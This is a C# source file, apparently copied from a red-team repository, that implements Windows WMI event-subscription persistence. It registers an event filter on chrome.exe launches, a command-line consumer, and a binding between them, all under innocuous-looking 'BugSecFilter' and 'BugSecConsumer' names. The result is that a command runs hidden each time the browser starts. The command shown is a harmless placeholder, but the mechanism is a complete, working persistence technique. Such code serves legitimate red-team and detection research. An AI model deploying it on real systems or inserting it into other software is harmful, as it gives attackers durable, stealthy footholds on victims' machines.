// Taken from https://github.com/mdsecactivebreach/WMIPersistence
// Author: @domchell

using System;
using System.Text;
using System.Management;

namespace WMIPersistence
{
  class Program
  {
    static void Main(string[] args)
    {
      PersistWMI();
    }
    static void PersistWMI()
    {
      ManagementObject myEventFilter = null;
      ManagementObject myEventConsumer = null;
      ManagementObject myBinder = null;

      string CommandLine = @"cmd.exe /c echo test > c:\WMI-CSharp.txt";

      try
      {
        ManagementScope scope = new ManagementScope(@"\\.\root\subscription");

        ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
        String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " +
                           "WHERE TargetInstance ISA \"Win32_Process\" " +
                           "AND TargetInstance.Name = \"chrome.exe\"";

        WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);
        myEventFilter = wmiEventFilter.CreateInstance();
        myEventFilter["Name"] = "BugSecFilter";
        myEventFilter["Query"] = myEventQuery.QueryString;
        myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
        myEventFilter["EventNameSpace"] = @"\root\cimv2";
        myEventFilter.Put();

        myEventConsumer = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null).CreateInstance();
        myEventConsumer["Name"] = "BugSecConsumer";
        myEventConsumer["CommandLineTemplate"] = CommandLine;
        myEventConsumer.Put();

        myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();
        myBinder["Filter"] = myEventFilter.Path.RelativePath;
        myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
        myBinder.Put();

      }
      catch (Exception e)
      {
        Console.WriteLine(e);
      }
      Console.ReadKey();
    }
  }
}